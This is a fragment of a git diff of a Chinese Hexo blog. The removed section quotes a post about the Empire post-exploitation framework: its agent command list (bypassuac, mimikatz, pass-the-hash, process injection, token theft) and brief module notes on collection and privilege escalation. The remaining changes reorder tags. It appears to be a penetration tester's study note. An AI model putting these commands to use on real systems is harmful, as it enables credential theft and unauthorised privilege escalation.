-<p><img src="https://machine-blog.oss-cn-beijing.aliyuncs.com/Blog/2020-11-02-Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/image-20201101184218822.png" alt="image-20201101184218822"></p>
-<h3 id="会话交互帮助"><a href="#会话交互帮助" class="headerlink" title="会话交互帮助"></a>会话交互帮助</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">(Empire: win10) &gt; help</span><br><span class="line"></span><br><span class="line">Agent Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">agents            Jump to the agents menu.</span><br><span class="line">back              Go back a menu.</span><br><span class="line">bypassuac         Runs BypassUAC, spawning a new high-integrity agent for a listener. Ex. spawn &lt;listener&gt;</span><br><span class="line">clear             Clear out agent tasking.</span><br><span class="line">creds             Display&#x2F;return credentials from the database.</span><br><span class="line">download          Task an agent to download a file.</span><br><span class="line">exit              Task agent to exit.</span><br><span class="line">help              Displays the help menu or syntax for particular commands.</span><br><span class="line">info              Display information about this agent</span><br><span class="line">injectshellcode   Inject listener shellcode into a remote process. Ex. injectshellcode &lt;meter_listener&gt; &lt;pid&gt;</span><br><span class="line">jobs              Return jobs or kill a running job.</span><br><span class="line">kill              Task an agent to kill a particular process name or ID.</span><br><span class="line">killdate          Get or set an agent&#39;s killdate (01&#x2F;01&#x2F;2016).</span><br><span class="line">list              Lists all active agents (or listeners).</span><br><span class="line">listeners         Jump to the listeners menu.</span><br><span class="line">lostlimit         Task an agent to change the limit on lost agent detection</span><br><span class="line">main              Go back to the main menu.</span><br><span class="line">mimikatz          Runs Invoke-Mimikatz on the client.</span><br><span class="line">psinject          Inject a launcher into a remote process. Ex. psinject &lt;listener&gt; &lt;pid&#x2F;process_name&gt;</span><br><span class="line">pth               Executes PTH for a CredID through Mimikatz.</span><br><span class="line">rename            Rename the agent.</span><br><span class="line">resource          Read and execute a list of Empire commands from a file.</span><br><span class="line">revtoself         Uses credentials&#x2F;tokens to revert token privileges.</span><br><span class="line">sc                Takes a screenshot, default is PNG. Giving a ratio means using JPEG. Ex. sc [1-100]</span><br><span class="line">scriptcmd         Execute a function in the currently imported PowerShell script.</span><br><span class="line">scriptimport      Imports a PowerShell script and keeps it in memory in the agent.</span><br><span class="line">searchmodule      Search Empire module names&#x2F;descriptions.</span><br><span class="line">shell             Task an agent to use a shell command.</span><br><span class="line">shinject          Inject non-meterpreter listener shellcode into a remote process. Ex. shinject &lt;listener&gt; &lt;pid&gt;</span><br><span class="line">sleep             Task an agent to &#39;sleep interval [jitter]&#39;</span><br><span class="line">spawn             Spawns a new Empire agent for the given listener name. Ex. spawn &lt;listener&gt;</span><br><span class="line">steal_token       Uses credentials&#x2F;tokens to impersonate a token for a given process ID.</span><br><span class="line">sysinfo           Task an agent to get system information.</span><br><span class="line">updatecomms       Dynamically update the agent comms to another listener</span><br><span class="line">updateprofile     Update an agent connection profile.</span><br><span class="line">upload            Task an agent to upload a file.</span><br><span class="line">usemodule         Use an Empire PowerShell module.</span><br><span class="line">workinghours      Get or set an agent&#39;s working hours (9:00-17:00).</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="模块（module）相关"><a href="#模块（module）相关" class="headerlink" title="模块（module）相关"></a>模块（module）相关</h2><p>usemodule 空格加两下 tab 可查看全部模块</p>
-<h4 id="信息收集模块"><a href="#信息收集模块" class="headerlink" title="信息收集模块"></a>信息收集模块</h4><p><code>usemodule collection</code></p>
-<h4 id="提权模块"><a href="#提权模块" class="headerlink" title="提权模块"></a>提权模块</h4><p><code>usemodule privesc/bypassuac </code></p>
-<p>bypassuac 提权模块【前带 * 号的就是高权限已经提权成功的 shell】</p>
-<h4 id="信息收集模块-1"><a href="#信息收集模块-1" class="headerlink" title="信息收集模块"></a>信息收集模块</h4><p><code>usemodule collection</code></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">工具、后渗透</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/11/02/Empire-%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1351,7 +1258,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2020 Machine
+    		&copy; 2021 Machine
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -1438,6 +1345,26 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Robocopy</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">文件管理</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">excel</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">学习</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">注册表</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">工作</a>
               </li>
              
@@ -1450,27 +1377,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Robocopy</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">文件管理</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">GIT</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">学习</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">注册表</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">excel</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1514,11 +1421,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">信息安全工程师，学习笔记</a>
+                <a href="javascript:void(0)" class="js-tag color3">工具</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">工具</a>
+                <a href="javascript:void(0)" class="js-tag color3">信息安全工程师，学习笔记</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1530,15 +1437,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">阿里云</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">JS</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">浏览器，开发</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">阿里云</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1563,6 +1470,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">kali</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">YUM</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">正则表达式</a>
               </li>
              
               <li class="article-tag-list-item">
